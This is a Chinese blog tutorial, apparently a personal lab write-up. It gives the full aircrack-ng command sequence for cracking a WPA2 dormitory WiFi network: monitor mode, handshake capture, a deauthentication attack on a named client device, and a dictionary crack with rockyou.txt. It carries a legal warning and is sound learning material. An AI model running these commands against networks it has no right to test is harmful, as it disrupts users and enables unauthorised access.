---
layout:	post
title:	雕虫小技
date	2018-06-06 13:00:12 +0800
categories: Kali
---

# 雕虫小技系列1

- 看到网上有关于使用**kali**破解WIFI的文章，去年CTF虽然曾使用过`aircrack-ng`对.cap包做过破解，但是还没有完整的进行过整个攻击过程，所以就想进行一次完整的实验
- 此文章中使用的是kali虚拟机和树莓派无线网卡
- **！随意破解他人WIFI犯法，请务必使用自己的WIFI进行实验！**

---

1. 使用的网卡型号是EP-N8508GS ，网店店主说除了树莓派以外的系统都需要装驱动，但是在我的WIn10机器和kali虚拟机上都可以直接使用

   ![]({{ site.url }}/imgs/trics/WIFI.jpg)

2. 输入`iwconfig`查看网卡名称

   ![]({{ site.url }}/Foto/trics/kali1.png)

3. 输入`airmon-ng start wlan0 `启动网卡Monitor模式

   ![]({{ site.url }}/Foto/trics/kali2.png)

4. 发现两个可能造成问题的进程，先把他们关掉

   ```
   ~# service network-manager stop
   ~# airmon-ng check kill
   ```

   ![]({{ site.url }}/Foto/trics/kali3.png)

5. 再次使用`iwconfig`确认已经进入monitor模式

   ![]({{ site.url }}/Foto/trics/kali4.png)

6. 输入`airodump-ng wlan0mon`进行抓包

   ![]({{ site.url }}/Foto/trics/kali5.png)

   

7. 选择对宿舍WIFI: BSSID=8C:A6:DF:D2:D8:40 CH=1 加密方式为：WPA2的宿舍WIFI进行数据抓包，输入`airodump-ng wlan0mon --bssid 8C:A6:DF:D2:D8:40 -c 1 -w wpa2`，-w 表示数据包存储位置，只抓取该WPA的数据包

   ![]({{ site.url }}/Foto/trics/kali6.png)

8. 之后需要等待用户连接或是重新连接WIFI，但是运气不好会等很久。在此使用**aireplay-ng**，强制断开用户的WiFi连接，输入`aireplay-ng -0 2 -a 8C:A6:DF:D2:D8:40 -c 0C:51:01:04:44:84 wlan0mon`，参数解释：`-0`发起DE authentication攻击，`-a`指定路由器BSSID，`-c`指定强制断开的设备。

   ![]({{ site.url }}/Foto/trics/kali7.png)

9. 成功获得四步握手包，执行`airmon-ng stop wlan0mon`结束无线网卡监听

    ![]({{ site.url }}/Foto/trics/kali8.png)

10. 查看抓到的握手包

   ![]({{ site.url }}/Foto/trics/kali9.png)

11. 使用kali默认的字典进行破解，字典目录为：/usr/share/wordlists/rockyou.txt.zip ，执行`gunzip rockyou.txt.zip`解压

12. 执行`aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2-02.cap`破解，此处有wpa2-01和wpa2-02两个文件，只需要关注最后一个文件

    ![]({{ site.url }}/Foto/trics/kali10.png)

13. 成功破解，也是因为宿舍WIFI是弱密码，由此可见WIFI密码设置不应该太随意